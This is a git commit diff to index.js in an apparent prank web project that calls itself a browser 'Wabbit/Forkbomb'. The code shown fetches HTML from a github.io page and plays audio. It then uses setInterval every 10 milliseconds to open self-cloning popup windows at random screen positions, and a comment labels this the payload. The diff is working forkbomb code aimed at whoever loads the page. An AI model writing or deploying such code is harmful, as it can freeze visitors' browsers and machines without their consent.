652edb3ac4e4226f920eca335d3f254695e9afc7
Jack <jack@insertdomain.name>
2020-02-15 21:05:38 -0500

    Update index.js

--- index.js
+++ index.js
@@ -1,16 +1,14 @@
 //Chrome experience requiem
 //A web browser based Wabbit/Forkbomb that is both obnoxious and a JoJos reference.
 let wabbitContent = '';
-
 (async () => {
 	wabbitContent = await (await fetch('https://k4rakara.github.io/chrome-experience-requiem/wabbit.html')).text();
 })();
 
 async function createWabbit() { //Create a very similar clone window, with code to clone itself.
-	let wabbit = window.open('','','width = 200,height = 200');
-	wabbit.document.write(wabbitContent);
+	let wabbit = window.open('https://k4rakara.github.io/chrome-experience-requiem/','Wha-','width = 200,height = 200');
+	wabbit.document.body.innerHTML = wabbitContent;
   	wabbit.moveTo((Math.random()*screen.width),(Math.random()*screen.height));
- 	wabbitsMade = wabbitsMade + 1;
 }
 
 setTimeout(function() {document.getElementById('theme').play(); setTimeout(function() {setInterval(createWabbit,10)}, 3000);}, 2750); //Wait for the voice clip to finish, then play the theme, and once the theme has gone on for 3 seconds, initialize the payload.
